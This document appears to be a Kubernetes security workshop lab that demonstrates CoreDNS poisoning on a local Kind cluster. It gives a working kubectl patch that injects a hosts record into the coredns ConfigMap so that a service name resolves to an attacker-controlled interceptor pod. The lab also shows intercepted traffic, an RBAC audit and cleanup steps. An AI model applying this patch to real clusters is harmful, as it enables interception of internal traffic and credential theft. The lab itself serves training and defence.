# CoreDNS Poisoning

If an attacker gains the ability to edit the CoreDNS ConfigMap — which requires only `configmaps/update` permission in the `kube-system` namespace — they can redirect arbitrary DNS names to an attacker-controlled pod and intercept all unencrypted traffic intended for those services.

## Description

CoreDNS is a modular Domain Name System (DNS) server written in Go, hosted by Cloud Native Computing Foundation (CNCF). CoreDNS is the main DNS service used in Kubernetes. The configuration of CoreDNS is controlled by a file named `Corefile`. In Kubernetes, this file is stored in a ConfigMap object named `coredns` in the `kube-system` namespace.

If an attacker has permissions to modify this ConfigMap — for example via the container's service account, a misconfigured RBAC binding, or direct cluster access — they can alter the DNS resolution behavior for the entire cluster. By adding custom records or rewrite rules, the attacker can:

- Redirect a legitimate service DNS name to a pod under their control.
- Intercept unencrypted traffic (HTTP, database connections, internal APIs).
- Perform credential harvesting against services that re-authenticate over the network.
- Facilitate further lateral movement by masquerading as trusted internal services.

## Prerequisites

- A running Kind cluster (`workshop-cluster`).
- `kubectl` installed and configured to connect to your cluster.
- Cluster-admin access (or access to modify the `coredns` ConfigMap in `kube-system`).

## Quick Start

### Step 1 — Deploy the scenario

Deploy a legitimate target service, an attacker-controlled interceptor pod, and a victim client pod that queries DNS and makes requests to the target service.

```bash
kubectl apply -f scenario.yaml
```

Wait for all pods to become ready:

```bash
kubectl wait --for=condition=Ready pod -l role=target -n coredns-demo --timeout=60s
kubectl wait --for=condition=Ready pod -l role=interceptor -n coredns-demo --timeout=60s
kubectl wait --for=condition=Ready pod -l role=victim -n coredns-demo --timeout=60s
```

Verify resources:

```bash
kubectl get all -n coredns-demo
```

Example output:

```
NAME                READY   STATUS    RESTARTS   AGE
pod/interceptor-…   1/1     Running   0          20s
pod/target-…        1/1     Running   0          20s
pod/victim-…        1/1     Running   0          20s

NAME                TYPE        CLUSTER-IP     PORT(S)
service/target-svc  ClusterIP   10.96.55.10    80/TCP
service/interceptor-svc ClusterIP 10.96.55.20  80/TCP
```

### Step 2 — Observe legitimate DNS resolution (baseline)

Exec into the victim pod and verify that `target-svc` resolves to the correct ClusterIP:

```bash
VICTIM_POD=$(kubectl get pod -n coredns-demo -l role=victim -o jsonpath='{.items[0].metadata.name}')
kubectl exec -it -n coredns-demo ${VICTIM_POD} -- sh
```

Inside the victim pod:

```bash
# Confirm DNS resolves to the correct service IP
nslookup target-svc.coredns-demo.svc.cluster.local

# Confirm the response comes from the legitimate target
curl -s http://target-svc.coredns-demo.svc.cluster.local/
exit
```

Expected output from curl:

```
Hello from the LEGITIMATE TARGET service
```

### Step 3 — Inspect the current CoreDNS ConfigMap

Understand the current Corefile before modifying it:

```bash
kubectl get configmap coredns -n kube-system -o yaml
```

The default Corefile looks like this:

```
.:53 {
    errors
    health {
       lameduck 5s
    }
    ready
    kubernetes cluster.local in-addr.arpa ip6.arpa {
       pods insecure
       fallthrough in-addr.arpa ip6.arpa
       ttl 30
    }
    prometheus :9153
    forward . /etc/resolv.conf {
       max_concurrent 1000
    }
    cache 30
    loop
    reload
    loadbalance
}
```

### Step 4 — Obtain the interceptor service ClusterIP

Record the ClusterIP of the attacker-controlled interceptor service. This is the IP DNS will return after the attack:

```bash
INTERCEPTOR_IP=$(kubectl get svc interceptor-svc -n coredns-demo \
    -o jsonpath='{.spec.clusterIP}')
echo "Interceptor ClusterIP: ${INTERCEPTOR_IP}"
```

### Step 5 — Poison the CoreDNS ConfigMap

Edit the CoreDNS ConfigMap to add a `rewrite` rule that redirects DNS queries for `target-svc.coredns-demo.svc.cluster.local` to the interceptor service's IP address.

The `rewrite` plugin in CoreDNS supports name rewrites. However, the most reliable approach for IP-level redirection is to use the `hosts` plugin to inject a static A record override.

```bash
# Patch the CoreDNS ConfigMap to add a hosts block before the kubernetes plugin
kubectl patch configmap coredns -n kube-system --type=merge -p "$(cat <<EOF
{
  "data": {
    "Corefile": ".:53 {\n    errors\n    health {\n       lameduck 5s\n    }\n    ready\n    hosts {\n      ${INTERCEPTOR_IP} target-svc.coredns-demo.svc.cluster.local\n      fallthrough\n    }\n    kubernetes cluster.local in-addr.arpa ip6.arpa {\n       pods insecure\n       fallthrough in-addr.arpa ip6.arpa\n       ttl 30\n    }\n    prometheus :9153\n    forward . /etc/resolv.conf {\n       max_concurrent 1000\n    }\n    cache 30\n    loop\n    reload\n    loadbalance\n}\n"
  }
}
EOF
)"
```

Alternatively, edit the ConfigMap interactively:

```bash
kubectl edit configmap coredns -n kube-system
```

Add the `hosts` block **before** the `kubernetes` plugin block:

```
hosts {
  INTERCEPTOR_IP target-svc.coredns-demo.svc.cluster.local
  fallthrough
}
```

Replace `INTERCEPTOR_IP` with the actual IP you recorded in Step 4.

CoreDNS watches the ConfigMap and reloads automatically (the `reload` plugin). Wait approximately 30 seconds for the reload to take effect, or force it:

```bash
kubectl rollout restart deployment/coredns -n kube-system
kubectl wait --for=condition=Available deployment/coredns -n kube-system --timeout=60s
```

### Step 6 — Verify the poisoned DNS resolution

Exec into the victim pod again and re-query DNS:

```bash
kubectl exec -it -n coredns-demo ${VICTIM_POD} -- sh
```

```bash
# DNS now resolves to the interceptor's IP instead of the target
nslookup target-svc.coredns-demo.svc.cluster.local

# Traffic is intercepted — response comes from the attacker pod
curl -s http://target-svc.coredns-demo.svc.cluster.local/
exit
```

Expected output from curl after poisoning:

```
*** INTERCEPTED by attacker pod ***
```

The victim sent traffic to `target-svc` but the interceptor received it. The victim has no indication the response came from a different host.

### Step 7 — Observe interceptor logs

Confirm traffic was received by the interceptor:

```bash
INTERCEPTOR_POD=$(kubectl get pod -n coredns-demo -l role=interceptor \
    -o jsonpath='{.items[0].metadata.name}')
kubectl logs -n coredns-demo ${INTERCEPTOR_POD}
```

Example output:

```
10.244.0.12 - - [01/Apr/2026:10:00:00 +0000] "GET / HTTP/1.1" 200 45 "-" "curl/8.5.0"
```

### Step 8 — Examine what CoreDNS privileges a service account needs for this attack

Any principal that can `update` or `patch` the `coredns` ConfigMap in `kube-system` can perform this attack. Identify overly permissive bindings:

```bash
# Find all ClusterRoleBindings and RoleBindings that allow configmap modification in kube-system
kubectl get clusterrolebindings -o json | \
    python3 -c "
import sys, json
data = json.load(sys.stdin)
for item in data['items']:
    ref = item.get('roleRef', {})
    if ref.get('name') in ['cluster-admin', 'edit', 'admin']:
        print(item['metadata']['name'], '->', ref['name'])
"

# Describe the coredns service account permissions
kubectl get clusterrolebinding system:coredns -o yaml
```

## Cleanup

Restore the original CoreDNS Corefile:

```bash
kubectl patch configmap coredns -n kube-system --type=merge -p '{
  "data": {
    "Corefile": ".:53 {\n    errors\n    health {\n       lameduck 5s\n    }\n    ready\n    kubernetes cluster.local in-addr.arpa ip6.arpa {\n       pods insecure\n       fallthrough in-addr.arpa ip6.arpa\n       ttl 30\n    }\n    prometheus :9153\n    forward . /etc/resolv.conf {\n       max_concurrent 1000\n    }\n    cache 30\n    loop\n    reload\n    loadbalance\n}\n"
  }
}'
kubectl rollout restart deployment/coredns -n kube-system
kubectl delete -f scenario.yaml
```

## Resources

- [CoreDNS](https://coredns.io/)
- [CoreDNS Hosts Plugin](https://coredns.io/plugins/hosts/)
- [CoreDNS Rewrite Plugin](https://coredns.io/plugins/rewrite/)
- [Kubernetes DNS for Services and Pods](https://kubernetes.io/docs/concepts/services-networking/dns-pod-service/)
- [MITRE ATT&CK - DNS Spoofing](https://attack.mitre.org/techniques/T1557/003/)
- [CoreDNS ConfigMap Customization](https://kubernetes.io/docs/tasks/administer-cluster/dns-custom-nameservers/)
